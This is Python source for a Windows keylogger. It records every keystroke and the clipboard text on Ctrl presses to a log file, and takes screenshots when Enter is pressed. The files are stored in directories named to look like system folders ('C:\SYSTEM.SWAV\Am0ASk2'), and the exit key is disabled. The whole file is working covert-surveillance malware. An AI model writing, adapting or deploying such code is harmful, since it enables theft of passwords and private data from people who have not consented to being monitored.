import logging
import os

from PIL import ImageGrab
from pynput import keyboard

import win32clipboard


# capture class will create screenshots


class capture():
    n = 0

    try:
        os.makedirs("C:\\SYSTEM.SWAV\\Am0ASk2", exist_ok=True)
    except OSError:
        pass

    def capture():
        savePath = '{0}{1}{2}'.format(
            'C:\\SYSTEM.SWAV\\Am0ASk2\\screenshot', capture.n, '.jpg')
        # grabs screenshots
        screenshot = ImageGrab.grab()
        screenshot.save(savePath)
        # stores the screenshots
        if os.path.exists(savePath):
            print('Expected')
            capture.n += 1
            savePath = '{0}{1}{2}'.format(
                'C:\\SYSTEM.SWAV\\Am0ASk2\\screanshot', capture.n, '.jpg')
            screenshot = ImageGrab.grab()
            screenshot.save(savePath)
            os.remove(savePath)


def logger():
    logDir = "C:\\SYSTEM.SWAV"
    logging.basicConfig(filename=(os.path.join(logDir, "Keys.log")), filemode="w", format='%(asctime)s:%(message)s',
                        level=logging.DEBUG)

    def ctrl_V():

        # detects ctrl+v events
        win32clipboard.OpenClipboard()
        pastedValue = win32clipboard.GetClipboardData(1)
        win32clipboard.CloseClipboard()
        logging.warning('------------------')
        logging.warning('{0} {1}'.format('Ctrl-V pressed: ', pastedValue))
        logging.warning('------------------')

    def on_press(key):
        try:
            logging.warning('--->  {0}'.format(key.char))
        except AttributeError:
            logging.warning('--->  {0}'.format(
                key))

    def on_release(key):
        logging.warning('---> {0} released'.format(key))
        # Turns off keylogger
        # if key == keyboard.Key.esc:
        #     return False
        if key == keyboard.Key.enter:
            capture.capture()
        if key == keyboard.Key.ctrl_l:
            # activate ctrl_V() only if clipboard content is text
            if win32clipboard.IsClipboardFormatAvailable(1) == 1:
                ctrl_V()

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
